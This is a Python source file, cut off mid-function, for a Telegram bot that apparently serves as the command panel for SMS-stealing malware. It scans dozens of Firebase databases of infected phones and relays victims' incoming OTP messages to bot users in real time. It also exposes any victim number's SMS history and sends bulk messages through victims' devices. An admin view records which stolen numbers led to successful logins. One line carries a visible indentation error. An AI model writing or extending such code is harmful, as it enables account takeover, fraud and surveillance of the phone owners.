import os
import re
import time
import html
import asyncio
import aiohttp
import logging
import random
from datetime import datetime, timezone, timedelta
from aiohttp import web

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)

# --- Configuration & Environment Variables ---
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN")
ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", 0))

# Your personal Firebase URL for logging everything
MY_DB_URL = os.environ.get("MY_DB_URL", "").strip().rstrip('/')

# Parse allowed users
ACCESS_USERS_STR = os.environ.get("ACCESS_USERS", "")
ACCESS_USERS = [int(x.strip()) for x in ACCESS_USERS_STR.split(",") if x.strip().lstrip('-').isdigit()]
if ADMIN_CHAT_ID != 0 and ADMIN_CHAT_ID not in ACCESS_USERS:
    ACCESS_USERS.append(ADMIN_CHAT_ID)

# Parse the 57 Service Provider Firebase URLs
FB_URLS_STR = os.environ.get("FIREBASE_URLS", "")
FIREBASE_URLS = list(dict.fromkeys([url.strip().rstrip('/') for url in FB_URLS_STR.split(",") if url.strip()]))

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.WARNING)

# Conversation States
ASK_TARGET_NUMBER = 1
ASK_MESSAGE_TEXT = 2
ASK_QUANTITY = 3
ASK_SPECIFIC_NUMBER = 4
ADMIN_WAIT_PAYLOAD = 5

# Global Trackers & Locks
BLOCKED_USERS = set()
active_otp_sessions = {}     # user_id: {"task": asyncio.Task, "session_id": int}
active_send_tasks = {}       # user_id: {"task": asyncio.Task}
user_action_locks = {}       # user_id: asyncio.Lock (Prevents double-click race conditions)

# Strict Deduplication Trackers
global_seen_ids = set()      # Stores "{fb_url}_{dev_id}_{msg_key_or_id}"
global_seen_content = {}     # Stores "{dev_id}_{sender}_{msg_hash}": timestamp (60s window)

# Admin number state cache (num -> "login"|"fail"); refreshed lazily
admin_marks_cache = {}       # num: {"status": "login"|"fail", "fb_url": ..., "dev_id": ...}
admin_marks_loaded_at = 0

# Shared HTTP Session for high speed across 57 DBs
http_session: aiohttp.ClientSession = None


# --- AIOHTTP Web Server for Render & UptimeRobot ---
async def health_check(request):
    return web.Response(text="Bot is running and healthy!")

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', health_check)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"Web server started on port {port} for UptimeRobot.")


# --- Shared HTTP Session & Firebase Helpers ---
async def get_http_session() -> aiohttp.ClientSession:
    global http_session
    if http_session is None or http_session.closed:
        connector = aiohttp.TCPConnector(limit=150, ttl_dns_cache=300)
        http_session = aiohttp.ClientSession(connector=connector)
    return http_session

async def fetch_json(url, timeout_secs=8):
    session = await get_http_session()
    try:
        async with session.get(f"{url}.json", timeout=timeout_secs) as response:
            if response.status == 200:
                return await response.json()
    except Exception:
        pass
    return None

async def put_json(url, payload, timeout_secs=5):
    session = await get_http_session()
    try:
        async with session.put(f"{url}.json", json=payload, timeout=timeout_secs) as response:
            return response.status == 200
    except Exception:
        pass
    return False

async def post_json(url, payload, timeout_secs=5):
    session = await get_http_session()
    try:
        async with session.post(f"{url}.json", json=payload, timeout=timeout_secs) as response:
            return response.status == 200
    except Exception:
        pass
    return False

async def patch_json(url, payload, timeout_secs=5):
    session = await get_http_session()
    try:
        async with session.patch(f"{url}.json", json=payload, timeout=timeout_secs) as response:
            return response.status == 200
    except Exception:
        pass
    return False


async def log_action_to_firebase(user_id, user_name, action, details=""):
    """Logs every bot action to the /mobiledevice node in YOUR personal database."""
    if not MY_DB_URL:
        return
    ist_tz = timezone(timedelta(hours=5, minutes=30))
    payload = {
        "timestamp": int(time.time() * 1000),
        "date_time": datetime.now(ist_tz).strftime('%Y-%m-%d %H:%M:%S'),
        "user_id": user_id,
        "user_name": user_name,
        "action": action,
        "details": details
    }
    asyncio.create_task(post_json(f"{MY_DB_URL}/mobiledevice", payload))


# --- Admin Number Mark Store (fail/login) ---
async def refresh_admin_marks_cache(force=False):
    """Load all marked numbers from MY_DB_URL/admin_number_marks into memory."""
    global admin_marks_cache, admin_marks_loaded_at
    if not MY_DB_URL:
        return
    if not force and (time.time() - admin_marks_loaded_at) < 20 and admin_marks_cache:
        return
    data = await fetch_json(f"{MY_DB_URL}/admin_number_marks")
    new_cache = {}
    if isinstance(data, dict):
        for num, entry in data.items():
            if isinstance(entry, dict):
                status = str(entry.get("status", "")).lower()
                if status in ("login", "fail"):
                    new_cache[str(num)] = {
                        "status": status,
                        "fb_url": entry.get("fb_url", ""),
                        "dev_id": entry.get("dev_id", ""),
                    }
    admin_marks_cache = new_cache
    admin_marks_loaded_at = time.time()


async def mark_admin_number(number, status, fb_url, dev_id, marked_by_name):
    """Save a number's status into MY_DB_URL/admin_number_marks/{number}."""
    if not MY_DB_URL:
        return False
    ist_tz = timezone(timedelta(hours=5, minutes=30))
    payload = {
        "status": status,
        "fb_url": fb_url,
        "dev_id": dev_id,
        "marked_at": int(time.time() * 1000),
        "marked_at_readable": datetime.now(ist_tz).strftime('%Y-%m-%d %H:%M:%S'),
        "marked_by": ADMIN_CHAT_ID,
        "marked_by_name": marked_by_name,
    }
    ok = await put_json(f"{MY_DB_URL}/admin_number_marks/{number}", payload)
    if ok:
        admin_marks_cache[number] = {"status": status, "fb_url": fb_url, "dev_id": dev_id}
    return ok


# --- Data Normalization & Schema Parsers ---
def clean_mobile_number(raw_num):
    if not raw_num:
        return None
    digits = re.sub(r'\D', '', str(raw_num))
    if len(digits) == 12 and digits.startswith('91'):
        digits = digits[2:]
    elif len(digits) == 11 and digits.startswith('0'):
        digits = digits[1:]
    if len(digits) == 10 and digits[0] in '6789':
        return digits
    return None

def extract_client_number(client_data):
    """Extracts mobile number across all 57 DB schema variations."""
    if not isinstance(client_data, dict):
        return None
    for key in ('mobNo', 'mobile', 'phoneNumber', 'number', 'sim1'):
        num = clean_mobile_number(client_data.get(key))
        if num:
            return num
    sims = client_data.get('sims')
    if isinstance(sims, list):
        for sim in sims:
            if isinstance(sim, dict):
                num = clean_mobile_number(sim.get('phoneNumber') or sim.get('mobNo') or sim.get('number'))
                if num:
                    return num
    elif isinstance(sims, dict):
        for sim in sims.values():
            if isinstance(sim, dict):
                num = clean_mobile_number(sim.get('phoneNumber') or sim.get('mobNo') or sim.get('number'))
                if num:
                    return num
    return None

def get_latest_timestamp(client_data, device_ping_data=None):
    """Calculates device activity timestamp across all schema types."""
    timestamps = [0]
    if isinstance(client_data, dict):
        ping_obj = client_data.get('ping')
        if isinstance(ping_obj, dict):
            ts = ping_obj.get('ts') or ping_obj.get('timestamp', 0)
            if str(ts).isdigit():
                timestamps.append(int(ts))
        elif str(ping_obj).isdigit():
            timestamps.append(int(ping_obj))

        hb_obj = client_data.get('heartbeat')
        if isinstance(hb_obj, dict):
            ts = hb_obj.get('timestamp') or hb_obj.get('ts', 0)
            if str(ts).isdigit():
                timestamps.append(int(ts))

        joined = client_data.get('joined', 0)
        if str(joined).isdigit():
            timestamps.append(int(joined))

    if isinstance(device_ping_data, dict):
        p_obj = device_ping_data.get('ping', {})
        if isinstance(p_obj, dict):
            ts = p_obj.get('ts', 0)
            if str(ts).isdigit():
                timestamps.append(int(ts))

    max_ts = max(timestamps)
    if 1_000_000_000 < max_ts < 10_000_000_000:
        max_ts *= 1000

    if max_ts == 0 and isinstance(client_data, dict):
        status = client_data.get('status')
        if status is True or str(status).lower() in ('online', 'true', 'active', '1'):
            max_ts = int((time.time() - 900) * 1000)

    return max_ts

def parse_messages(raw_data):
    msgs = []
    if isinstance(raw_data, dict):
        for k, v in raw_data.items():
            if isinstance(v, dict):
                msgs.append((str(k), v))
    elif isinstance(raw_data, list):
        for i, v in enumerate(raw_data):
            if isinstance(v, dict):
                msgs.append((str(i), v))
    return msgs

def is_incoming_sms(msg_dict):
    msg_type = str(msg_dict.get('type', 'incoming')).lower().strip()
    if msg_type in ('outgoing', 'sent', 'out', '2'):
        return False
    if 'isSended' in msg_dict or '_wake' in msg_dict:
        return False
    return True

def is_duplicate_sms(fb_url, dev_id, fb_key, msg_dict, record_only=False):
    inner_id = str(msg_dict.get('id', '')).strip()
    key_id = str(fb_key).strip()

    uid_key = f"{fb_url}_{dev_id}_k_{key_id}"
    uid_inner = f"{fb_url}_{dev_id}_i_{inner_id}" if inner_id else uid_key

    sender = str(msg_dict.get('sender', 'Unknown')).strip().upper()
    text = re.sub(r'\s+', ' ', str(msg_dict.get('message', '')).strip())
    content_sig = f"{dev_id}_{sender}_{text}"

    now = time.time()

    if record_only:
        global_seen_ids.add(uid_key)
        global_seen_ids.add(uid_inner)
        if text:
            global_seen_content[content_sig] = now
        return True

    if uid_key in global_seen_ids or uid_inner in global_seen_ids:
        return True

    if text and content_sig in global_seen_content:
        if now - global_seen_content[content_sig] < 60:
            global_seen_ids.add(uid_key)
            global_seen_ids.add(uid_inner)
            return True

    global_seen_ids.add(uid_key)
    global_seen_ids.add(uid_inner)
    if text:
        global_seen_content[content_sig] = now

    if len(global_seen_content) > 5000:
        cutoff = now - 120
        for k in [k for k, ts in global_seen_content.items() if ts < cutoff]:
            global_seen_content.pop(k, None)

    return False


# --- Authorization & UI Helpers ---
def is_authorized(user_id):
    return user_id in ACCESS_USERS and user_id not in BLOCKED_USERS

def is_admin(user_id):
    return ADMIN_CHAT_ID != 0 and user_id == ADMIN_CHAT_ID

def cancel_user_otp_task(user_id):
    session = active_otp_sessions.pop(user_id, None)
    if session and session.get("task"):
        session["task"].cancel()

def cancel_user_send_task(user_id):
    session = active_send_tasks.pop(user_id, None)
    if session and session.get("task"):
        session["task"].cancel()

async def notify_admin(context, message):
    if ADMIN_CHAT_ID:
        try:
            await context.bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=f"🛡️ <b>[ADMIN]</b>\n{message}",
                parse_mode="HTML"
            )
        except Exception:
            pass

def get_cancel_keyboard():
    return InlineKeyboardMarkup([[InlineKeyboardButton("Cancel ❌", callback_data="cancel_action")]])

def get_main_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Get OTP 📩", callback_data="get_otp")],
        [InlineKeyboardButton("Get Msg on Specific No. 🎯", callback_data="get_specific_no")],
        [InlineKeyboardButton("Send Message 📤", callback_data="send_message")]
    ])


# --- General Handlers ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not is_authorized(user.id):
        return
    welcome_text = (
        f"Welcome, <b>{html.escape(user.first_name)}</b>! 👋\n\n"
        "I am your high-performance, cross-database Firebase SMS Controller.\n"
        "Choose an action below:"
    )
    await update.message.reply_text(welcome_text, parse_mode="HTML", reply_markup=get_main_menu())
    await log_action_to_firebase(user.id, user.first_name, "STARTED_BOT")

async def cancel_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("Action Cancelled 🛑", reply_markup=get_main_menu())
    return ConversationHandler.END

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Action Cancelled 🛑", reply_markup=get_main_menu())
    return ConversationHandler.END


# --- Admin Commands ---
async def cmd_block(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID:
        return
    try:
        target_id = int(context.args[0])
        BLOCKED_USERS.add(target_id)
        cancel_user_otp_task(target_id)
        cancel_user_send_task(target_id)
        await update.message.reply_text(f"✅ User {target_id} blocked and tasks stopped.")
        await log_action_to_firebase(ADMIN_CHAT_ID, "Admin", "BLOCKED_USER", f"Blocked User ID: {target_id}")
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /block <chat_id>")

async def cmd_release(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID:
        return
    try:
        target_id = int(context.args[0])
        BLOCKED_USERS.discard(target_id)
        await update.message.reply_text(f"✅ User {target_id} unblocked.")
        await log_action_to_firebase(ADMIN_CHAT_ID, "Admin", "UNBLOCKED_USER", f"Unblocked User ID: {target_id}")
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /release <chat_id>")

async def cmd_cancelsend(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID:
        return
    try:
        target_id = int(context.args[0])
        if target_id in active_send_tasks:
            cancel_user_send_task(target_id)
            await update.message.reply_text(f"✅ Terminated user {target_id}'s batch task.")
            await log_action_to_firebase(ADMIN_CHAT_ID, "Admin", "CANCELLED_USER_SEND", f"Target User ID: {target_id}")
        else:
            await update.message.reply_text(f"User {target_id} does not have an active sending task.")
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /cancelsend <chat_id>")

async def cmd_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/login — Show all numbers marked as LOGIN by admin."""
    if update.effective_user.id != ADMIN_CHAT_ID:
        return
    await refresh_admin_marks_cache(force=True)
    login_nums = [(n, v) for n, v in admin_marks_cache.items() if v.get("status") == "login"]
    if not login_nums:
        await update.message.reply_text("No numbers marked as LOGIN yet.")
        return
    login_nums.sort(key=lambda x: x[0])
    lines = [f"✅ <b>Numbers marked LOGIN:</b> {len(login_nums)}\n"]
    for num, entry in login_nums:
        fb = entry.get("fb_url", "")
        # show shortened db identifier
        db_tag = fb.split("//")[-1].split(".")[0] if fb else "?"
        lines.append(f"• <code>{num}</code> — <i>{html.escape(db_tag)}</i>")
    text = "\n".join(lines)
    if len(text) > 4000:
        text = text[:4000] + "\n…(truncated)"
    await update.message.reply_text(text, parse_mode="HTML")
    await log_action_to_firebase(ADMIN_CHAT_ID, "Admin", "LISTED_LOGIN_NUMBERS", f"Count: {len(login_nums)}")

async def cmd_admin_send(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID:
        return ConversationHandler.END
    try:
        target_id = int(context.args[0])
        context.user_data['admin_target_chat'] = target_id
        await update.message.reply_text(
            f"Send the message, photo, or video you want to forward to {target_id}:",
            reply_markup=get_cancel_keyboard()
        )
        return ADMIN_WAIT_PAYLOAD
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /send <chat_id>")
        return ConversationHandler.END

async def admin_forward_payload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    target_id = context.user_data.get('admin_target_chat')
    try:
        await update.message.copy(chat_id=target_id)
        await update.message.reply_text(f"✅ Successfully sent to {target_id}.")
        await log_action_to_firebase(ADMIN_CHAT_ID, "Admin", "ADMIN_DIRECT_MESSAGE", f"Sent payload to User ID: {target_id}")
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to send: {e}")
    return ConversationHandler.END


# --- Core OTP Workflow ---
async def handle_get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE, is_new=False):
    query = update.callback_query
    user = query.from_user
    admin_mode = is_admin(user.id)

    lock = user_action_locks.setdefault(user.id, asyncio.Lock())
    if lock.locked():
        return

    # helper: emit/update status depending on admin mode
    status_message = None
    async def show_status(text, kb=None):
        nonlocal status_message
        try:
            if admin_mode:
                status_message = await context.bot.send_message(
                    chat_id=query.message.chat_id,
                    text=text,
                    parse_mode="HTML",
                    reply_markup=kb if kb is not None else None
                )
            else:
                await query.edit_message_text(text, reply_markup=kb)
                status_message = query.message
        except Exception:
            pass

    async with lock:
        cancel_user_otp_task(user.id)

        await show_status("Searching provider databases for an active number... ⏳")

        # Refresh admin marks if this is admin
        if admin_mode:
            await refresh_admin_marks_cache(force=True)
            failed_set = {n for n, v in admin_marks_cache.items() if v.get("status") == "fail"}
        else:
            failed_set = set()

        fetch_tasks = [fetch_json(f"{fb_url}/clients") for fb_url in FIREBASE_URLS]
        results = await asyncio.gather(*fetch_tasks)

        now_ms = int(time.time() * 1000)

        def collect_devices(cutoff_ms, seen_numbers, exclude_set):
            found = []
            for fb_url, clients_data in zip(FIREBASE_URLS, results):
                if not clients_data or not isinstance(clients_data, dict):
                    continue
                for dev_id, client in clients_data.items():
                    ts = get_latest_timestamp(client)
                    if ts < cutoff_ms:
                        continue
                    valid_num = extract_client_number(client)
                    if not valid_num:
                        continue
                    if valid_num in exclude_set:
                        continue
                    if valid_num in seen_numbers:
                        continue
                    seen_numbers.add(valid_num)
                    found.append({
                        'fb_url': fb_url,
                        'dev_id': dev_id,
                        'num': valid_num,
                        'ts': ts
                    })
            return found

        all_active_devices = []
        seen_numbers = set()

        if admin_mode:
            # Admin: 10-minute steps up to 60 minutes, skipping failed numbers
            for window in range(10, 61, 10):
                cutoff_ms = now_ms - (window * 60 * 1000)
                all_active_devices = collect_devices(cutoff_ms, seen_numbers, failed_set)
                if all_active_devices:
                    break
        else:
            # Non-admin: original fallback windows
            for window in (10, 40, 70, 100, 130, 160, 190, 220, 250, 280, 310, 340, 370, 400, 430, 460, 490, 520, 550, 580, 610, 640, 670, 700, 730, 760, 790, 820, 850, 880, 910, 940, 970, 1000, 1030, 1060, 1090, 1120, 1150, 1180, 1210, 1240, 1270, 1300, 1330, 1360, 1390, 1420, 1440):
                cutoff_ms = now_ms - (window * 60 * 1000)
                all_active_devices = collect_devices(cutoff_ms, seen_numbers, failed_set)
                if all_active_devices:
                    break

        if not all_active_devices:
            try:
                await show_status("❌ No active numbers found.", kb=get_main_menu())
            except Exception:
                pass
            return

        all_active_devices.sort(key=lambda x: x['ts'], reverse=True)
        previously_used = context.user_data.get('used_numbers', set())
        selected = None

        if is_new:
            for device in all_active_devices:
                if device['num'] not in previously_used:
                    selected = device
                    break
            if not selected:
                previously_used.clear()
                selected = random.choice(all_active_devices[:min(5, len(all_active_devices))])
        else:
            selected = all_active_devices[0]

        context.user_data.setdefault('used_numbers', set()).add(selected['num'])

        action = "Requested New Number" if is_new else "Requested OTP"
        await log_action_to_firebase(user.id, user.first_name, action, f"Allocated Number: {selected['num']}")
        if not admin_mode:
            await notify_admin(context, f"User <b>{html.escape(user.first_name)}</b> ({user.id}) {action}: <code>{selected['num']}</code>")

        if admin_mode:
            kb = [
                [InlineKeyboardButton("Get New Number 🔄", callback_data="get_new_number")],
                [
                    InlineKeyboardButton("Login ✅", callback_data=f"admin_login_{selected['num']}"),
                    InlineKeyboardButton("Fail ❌", callback_data=f"admin_fail_{selected['num']}"),
                ],
                [InlineKeyboardButton("Cancel Number ❌", callback_data="cancel_number")],
            ]
        else:
            kb = [
                [InlineKeyboardButton("Get New Number 🔄", callback_data="get_new_number")],
                [InlineKeyboardButton("Cancel Number ❌", callback_data="cancel_number")],
            ]

        shown_text = (
            f"✅ <b>Number Found:</b> <code>{selected['num']}</code>\n"
            f"Status: <b>Valid for 5 Minutes</b> ⏱️\n"
            f"Send your SMS. New messages will appear here."
        )

        await show_status(shown_text, kb=InlineKeyboardMarkup(kb))

        session_id = int(time.time() * 1000)
        task = asyncio.create_task(
            monitor_otp(
                context,
                user.id,
                query.message.chat_id,
                selected['fb_url'],
                selected['dev_id'],
                selected['num'],
                300,
                session_id
            )
        )
        active_otp_sessions[user.id] = {"task": task, "session_id": session_id}


async def monitor_otp(context, user_id, chat_id, fb_url, dev_id, mobile_number, duration_secs, session_id):
    end_time = time.time() + duration_secs

    initial_raw = await fetch_json(f"{fb_url}/messages/{dev_id}")
    initial_msgs = parse_messages(initial_raw)
    for k, m in initial_msgs:
        is_duplicate_sms(fb_url, dev_id, k, m, record_only=True)

    try:
        while time.time() < end_time:
            current_session = active_otp_sessions.get(user_id)
            if not current_session or current_session.get("session_id") != session_id:
                return

            fresh_raw = await fetch_json(f"{fb_url}/messages/{dev_id}")
            fresh_msgs = parse_messages(fresh_raw)

            for k, m in fresh_msgs:
                if not is_incoming_sms(m):
                    continue

                if not is_duplicate_sms(fb_url, dev_id, k, m, record_only=False):
                    sender = html.escape(str(m.get('sender', 'Unknown')))
                    text = html.escape(str(m.get('message', '')))
                    dt = html.escape(str(m.get('dateTime', 'Just Now')))

                    alert = (
                        f"🔔 <b>NEW MESSAGE</b> 🔔\n\n"
                        f"<b>To:</b> <code>{mobile_number}</code>\n"
                        f"<b>From:</b> {sender}\n"
                        f"<b>Time:</b> {dt}\n\n"
                        f"<b>Message:</b>\n<code>{text}</code>"
                    )

                    try:
                        await context.bot.send_message(chat_id=chat_id, text=alert, parse_mode="HTML")
                        await notify_admin(context, f"User <code>{user_id}</code> Received SMS on <code>{mobile_number}</code>:\n\n{alert}")
                        await log_action_to_firebase(user_id, "User", "RECEIVED_SMS", f"To: {mobile_number} | From: {sender} | Msg: {text}")
                    except Exception as e:
                        logging.error(f"Telegram send error: {e}")

            await asyncio.sleep(2.5)

        current_session = active_otp_sessions.get(user_id)
        if current_session and current_session.get("session_id") == session_id:
            active_otp_sessions.pop(user_id, None)
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"⏰ The 5-minute window for <code>{mobile_number}</code> has expired.",
                parse_mode="HTML",
                reply_markup=get_main_menu()
            )

    except asyncio.CancelledError:
        pass
    except Exception as e:
        logging.error(f"Monitor error: {e}")


# --- Admin: Mark Number Login / Fail ---
async def handle_admin_mark(update: Update, context: ContextTypes.DEFAULT_TYPE, status: str):
    query = update.callback_query
    user = query.from_user
    if not is_admin(user.id):
        return
    await query.answer()

    # callback_data format: admin_login_<num> or admin_fail_<num>
    prefix = "admin_login_" if status == "login" else "admin_fail_"
    number = query.data[len(prefix):].strip()
    number = clean_mobile_number(number)
    if not number:
        await query.edit_message_text("❌ Invalid number in callback.", reply_markup=get_main_menu())
        return

    # Look up the fb_url/dev_id for this num from currently active scan (cached in user_data or marks)
    fb_url = ""
    dev_id = ""

    # Try to find it in the last fetched device list by scanning again (light call)
    fetch_tasks = [fetch_json(f"{f}/clients") for f in FIREBASE_URLS]
    results = await asyncio.gather(*fetch_tasks)
    for f_url, clients_data in zip(FIREBASE_URLS, results):
        if not isinstance(clients_data, dict):
            continue
        for d_id, client in clients_data.items():
            if extract_client_number(client) == number:
                fb_url = f_url
                dev_id = d_id
                break
        if fb_url:
            break

    ok = await mark_admin_number(number, status, fb_url, dev_id, user.first_name)

        label = "✅ LOGIN" if status == "login" else "❌ FAIL"
    result_note = "Saved to DB." if ok else "⚠️ Failed to save to MY_DB_URL (check env)."
    try:
        await query.edit_message_text(
            f"{label} — Number <code>{number}</code> {result_note}\n"
            f"This number will not be shown to you again as active.",
            parse_mode="HTML",
            reply_markup=get_main_menu()
        )
    except Exception:
        pass

    # Cancel any active monitoring session for this number
    cancel_user_otp_task(user.id)

    await log_action_to_firebase(
        user.id, user.first_name,
        "ADMIN_MARKED_" + status.upper(),
        f"Number: {number} | fb_url: {fb_url} | dev_id: {dev_id}"
    )


# --- Get Message on Specific Number Flow ---
async def start_specific_no(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not is_authorized(query.from_user.id):
        return ConversationHandler.END
    await query.answer()
    await query.edit_message_text("Enter the 10-digit mobile number to monitor:", reply_markup=get_cancel_keyboard())
    return ASK_SPECIFIC_NUMBER

async def fetch_specific_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not is_authorized(user.id):
        return ConversationHandler.END

    raw_num = update.message.text.strip()
    target_num = clean_mobile_number(raw_num)

    if not target_num:
        await update.message.reply_text("❌ Invalid format. Please enter a valid 10-digit Indian mobile number.", reply_markup=get_cancel_keyboard())
        return ASK_SPECIFIC_NUMBER

    status_msg = await update.message.reply_text("Searching all 57 databases for this number... ⏳", reply_markup=get_cancel_keyboard())

    fetch_tasks = [fetch_json(f"{fb_url}/clients") for fb_url in FIREBASE_URLS]
    results = await asyncio.gather(*fetch_tasks)

    matching_devices = []
    for fb_url, clients_data in zip(FIREBASE_URLS, results):
        if not clients_data or not isinstance(clients_data, dict):
            continue
        for dev_id, client in clients_data.items():
            c_num = extract_client_number(client)
            if c_num == target_num:
                matching_devices.append((get_latest_timestamp(client), fb_url, dev_id))

    if not matching_devices:
        await status_msg.edit_text(
            f"❌ Number <code>{target_num}</code> not found in any database.",
            parse_mode="HTML",
            reply_markup=get_main_menu()
        )
        return ConversationHandler.END

    matching_devices.sort(key=lambda x: x[0], reverse=True)
    _, fb_url, dev_id = matching_devices[0]

    await notify_admin(context, f"User <b>{html.escape(user.first_name)}</b> requested specific tracking for <code>{target_num}</code>")
    await log_action_to_firebase(user.id, user.first_name, "TRACKED_SPECIFIC_NUMBER", f"Number: {target_num}")

    raw_msgs = await fetch_json(f"{fb_url}/messages/{dev_id}")
    parsed_msgs = parse_messages(raw_msgs)

    unique_history = []
    seen_hist_sigs = set()
    sorted_msgs = sorted(
        parsed_msgs,
        key=lambda item: int(item[1].get('id', item[0])) if str(item[1].get('id', item[0])).isdigit() else 0
    )

    for k, m in sorted_msgs:
        if not is_incoming_sms(m):
            continue
        sig = f"{m.get('sender', '')}_{re.sub(r'\\s+', ' ', str(m.get('message', '')).strip())}"
        if sig not in seen_hist_sigs:
            seen_hist_sigs.add(sig)
            unique_history.append(m)

    last_10 = unique_history[-10:]
    msg_history = f"✅ <b>Found Number:</b> <code>{target_num}</code>\n\n<b>--- Last {len(last_10)} Incoming Messages ---</b>\n"
    for m in last_10:
        dt = html.escape(str(m.get('dateTime', '')))
        sdr = html.escape(str(m.get('sender', '')))
        txt = html.escape(str(m.get('message', '')))
        msg_history += f"[{dt}] <b>{sdr}:</b> <code>{txt}</code>\n\n"
    msg_history += "📡 <b>Starting Real-Time Listening (5 Mins)...</b>"

    if len(msg_history) > 4000:
        msg_history = msg_history[-4000:]

    kb = [[InlineKeyboardButton("Cancel Listening ❌", callback_data="cancel_number")]]
    await status_msg.edit_text(msg_history, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))

    cancel_user_otp_task(user.id)
    session_id = int(time.time() * 1000)
    task = asyncio.create_task(
        monitor_otp(context, user.id, update.message.chat_id, fb_url, dev_id, target_num, 300, session_id)
    )
    active_otp_sessions[user.id] = {"task": task, "session_id": session_id}

    return ConversationHandler.END


# --- Send Message Workflow ---
async def start_send_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not is_authorized(query.from_user.id):
        return ConversationHandler.END
    await query.answer()
    await query.edit_message_text("Enter the <b>Target Mobile Number</b>:", parse_mode="HTML", reply_markup=get_cancel_keyboard())
    return ASK_TARGET_NUMBER

async def ask_msg_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['target_number'] = update.message.text.strip()
    await update.message.reply_text("Enter the <b>Custom Message</b> you want to send:", parse_mode="HTML", reply_markup=get_cancel_keyboard())
    return ASK_MESSAGE_TEXT

async def ask_quantity(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['custom_message'] = update.message.text.strip()
    await update.message.reply_text("Enter the <b>Total Quantity</b> of messages to send (e.g., 10):", parse_mode="HTML", reply_markup=get_cancel_keyboard())
    return ASK_QUANTITY

async def process_sending(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    try:
        quantity = int(update.message.text.strip())
        if quantity <= 0:
            raise ValueError
    except ValueError:
        await update.message.reply_text("Invalid quantity. Aborting.", reply_markup=get_main_menu())
        return ConversationHandler.END

    target_number = context.user_data.get('target_number')
    msg_text = context.user_data.get('custom_message')

    kb = [[InlineKeyboardButton("Stop Sending 🛑", callback_data="stop_sending")]]
    status_msg = await update.message.reply_text("Initializing message batch... 🚀", reply_markup=InlineKeyboardMarkup(kb))

    cancel_user_send_task(user.id)
    task = asyncio.create_task(run_batch_send(context, user, target_number, msg_text, quantity, status_msg))
    active_send_tasks[user.id] = {"task": task}

    return ConversationHandler.END

async def trigger_send_sms(fb_url, dev_id, payload):
    path1 = f"{fb_url}/clients/{dev_id}/webhookEvent/sendSms"
    path2 = f"{fb_url}/{dev_id}/webhookEvent/sendSms"
    res1, res2 = await asyncio.gather(
        put_json(path1, payload),
        put_json(path2, payload)
    )
    return res1 or res2

async def run_batch_send(context, user, target_number, msg_text, quantity, status_msg):
    await notify_admin(
        context,
        f"User <b>{html.escape(user.first_name)}</b> sending {quantity} msgs to <code>{html.escape(target_number)}</code>.\n\n"
        f"Payload:\n<code>{html.escape(msg_text)}</code>"
    )
    await log_action_to_firebase(user.id, user.first_name, "BATCH_SEND_STARTED", f"Target: {target_number} | Qty: {quantity} | Msg: {msg_text}")

    fetch_tasks = [fetch_json(f"{fb_url}/clients") for fb_url in FIREBASE_URLS]
    results = await asyncio.gather(*fetch_tasks)

    now_ms = int(time.time() * 1000)
    active_devices = []

    for window_mins in (10, 30, 120, 1440):
        cutoff_ms = now_ms - (window_mins * 60 * 1000)
        for fb_url, clients_data in zip(FIREBASE_URLS, results):
            if not clients_data or not isinstance(clients_data, dict):
                continue
            for dev_id, client in clients_data.items():
                if get_latest_timestamp(client) >= cutoff_ms:
                    active_devices.append((fb_url, dev_id))
        if active_devices:
            break

    if not active_devices:
        await status_msg.edit_text("❌ No active devices found.", reply_markup=get_main_menu())
        return

    random.shuffle(active_devices)
    success, failed = 0, 0
    kb = [[InlineKeyboardButton("Stop Sending 🛑", callback_data="stop_sending")]]

    try:
        for i in range(1, quantity + 1):
            fb_url, dev_id = active_devices[(i - 1) % len(active_devices)]
            payload = {
                "to": target_number,
                "message": msg_text,
                "isSended": False,
                "from": 1,
                "_wake": True,
                "type": "outgoing",
                "_nonce": f"wake_{int(time.time() * 1000)}_{i}"
            }

            ok = await trigger_send_sms(fb_url, dev_id, payload)
            if ok:
                success += 1
            else:
                failed += 1

            if i % 3 == 0 or i == quantity:
                filled = int(15 * i / quantity)
                bar = f"[{'█' * filled}{'░' * (15 - filled)}]"
                try:
                    await status_msg.edit_text(
